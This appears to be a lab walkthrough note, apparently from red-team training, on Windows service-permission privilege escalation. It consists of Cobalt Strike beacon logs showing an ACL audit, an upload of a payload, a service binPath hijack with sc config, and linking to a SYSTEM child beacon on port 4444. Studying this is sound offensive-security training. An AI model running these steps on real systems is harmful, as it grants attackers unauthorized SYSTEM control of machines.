##### execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

shows that `VulnService2` is modifiable is supposed to show
```powershell
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

=== Modifiable Services ===

	Service 'VulnService2' (State: Running, StartMode: Auto)
```
the result I was getting
```powershell
[11/07 20:57:27] beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit
[11/07 20:57:28] [*] Tasked beacon to run .NET program: SharpUp.exe audit
[11/07 20:57:28] [+] host called home, sent: 149266 bytes
[11/07 20:57:28] [+] received output:

=== SharpUp: Running Privilege Escalation Checks ===

[*] In medium integrity but user is a local administrator- UAC can be bypassed.

[*] Audit mode: running an additional 15 check(s).
```
in order to see the actual `acl` of the service
```powershell
[11/07 20:58:56] beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
[11/07 20:58:56] [*] Tasked beacon to run: Get-ServiceAcl -Name VulnService2 | select -expand Access
[11/07 20:58:56] [+] host called home, sent: 437 bytes
[11/07 20:59:01] [+] received output:
#< CLIXML


ServiceRights     : QueryConfig, QueryStatus, EnumerateDependents, Interrogate, UserDefinedControl, ReadControl
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\INTERACTIVE
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

ServiceRights     : QueryConfig, QueryStatus, EnumerateDependents, Interrogate, UserDefinedControl, ReadControl
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\SERVICE
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

																																																														ServiceRights     : ChangeConfig, Start, Stop
																																																														AccessControlType : AccessAllowed
																																																														IdentityReference : NT AUTHORITY\Authenticated Users
																																																														IsInherited       : False
																																																														InheritanceFlags  : None
																																																														PropagationFlags  : None

ServiceRights     : QueryConfig, QueryStatus, EnumerateDependents, Start, Stop, PauseContinue, Interrogate, 
                    UserDefinedControl, ReadControl
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\SYSTEM
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, PauseContinue, 
                    Interrogate, UserDefinedControl, Delete, ReadControl, WriteDac, WriteOwner
AccessControlType : AccessAllowed
IdentityReference : BUILTIN\Administrators
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

```
the results show that anyone in the `NT AUTHORITY\Authenticated Users` group is allowed to `ChangeConfig, Start, Stop`

identifying the location of `VulnService2`
```powershell
[11/07 21:10:25] beacon> run sc qc VulnService2
[11/07 21:10:25] [*] Tasked beacon to run: sc qc VulnService2
[11/07 21:10:25] [+] host called home, sent: 48 bytes
[11/07 21:10:25] [+] received output:
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnService2
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Vulnerable Services\Service 2.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : VulnService2
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```
making a `C:\Temp` directory
```powershell
beacon> mkdir C:\Temp
beacon> cd C:\Temp
```
uploading  service executable `c:\Payloads\tcp-local_x64.svc.exe`
```bash
[11/07 22:18:55] beacon> upload C:\Payloads\tcp-localonly_x64.svc.exe
[11/07 22:18:56] [*] Tasked beacon to upload C:\Payloads\tcp-localonly_x64.svc.exe as tcp-localonly_x64.svc.exe
[11/07 22:18:56] [+] host called home, sent: 329777 bytes
```
ensuring that the file was uploaded with `ls`
```bash
[11/07 22:19:18] beacon> ls
[11/07 22:19:18] [*] Tasked beacon to list files in .
[11/07 22:19:18] [+] host called home, sent: 31 bytes
[11/07 22:19:18] [*] Listing: c:\temp\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 322kb    fil     11/07/2023 22:18:57   tcp-localonly_x64.svc.exe
```
changing the binary path of `VulnService2` by utilizing the `binPath= `
*Note that the `space` after the = in `binPath` is intentional and required for syntax*
```powershell
[11/07 22:19:28] beacon> run sc config VulnService2 binPath= C:\Temp\tcp-localonly_x64.svc.exe
[11/07 22:19:28] [*] Tasked beacon to run: sc config VulnService2 binPath= C:\Temp\tcp-localonly_x64.svc.exe
[11/07 22:19:28] [+] host called home, sent: 95 bytes
[11/07 22:19:28] [+] received output:
[SC] ChangeServiceConfig SUCCESS
```
checking status of `VulnService2` to ensure that the `BINARY_PATH_NAME` was actually changed.
- the path was correctly updated to the new beacon.

stopping the `VulnService2`
```bash
[11/07 22:19:53] beacon> run sc stop VulnService2
[11/07 22:19:53] [*] Tasked beacon to run: sc stop VulnService2
[11/07 22:19:53] [+] host called home, sent: 50 bytes
[11/07 22:19:54] [+] received output:

SERVICE_NAME: VulnService2 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
starting the `VulnService2`
```powershell
[11/07 22:21:29] beacon> run sc start VulnService2
[11/07 22:21:29] [*] Tasked beacon to run: sc start VulnService2
[11/07 22:21:29] [+] host called home, sent: 51 bytes
[11/07 22:21:29] [+] received output:

SERVICE_NAME: VulnService2 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4480
        FLAGS              : 
```
checking to ensure port `4444` is open
```powershell
[11/07 22:21:50] beacon> shell netstat -anp tcp
[11/07 22:21:50] [*] Tasked beacon to run: netstat -anp tcp
[11/07 22:21:51] [+] host called home, sent: 59 bytes
[11/07 22:21:51] [+] received output:

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING
  TCP    127.0.0.1:4444         127.0.0.1:62122        ESTABLISHED
```
connecting to `4444`
```powershell
[11/07 22:22:00] beacon> connect localhost 4444
[11/07 22:22:00] [*] Tasked to connect to localhost:4444
[11/07 22:22:00] [+] host called home, sent: 32 bytes
[11/07 22:22:00] [+] established link to child beacon: 10.10.123.102
```
seeing that two seperate connections to `4444` are working
```
[11/07 22:22:09] beacon> shell netstat -anp tcp
[11/07 22:22:09] [*] Tasked beacon to run: netstat -anp tcp
[11/07 22:22:09] [+] host called home, sent: 71 bytes
[11/07 22:22:09] [+] received output:

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    127.0.0.1:4444         127.0.0.1:58146        ESTABLISHED
  TCP    127.0.0.1:4444         127.0.0.1:62122        ESTABLISHED
```
![[Pasted image 20231107173244.png]]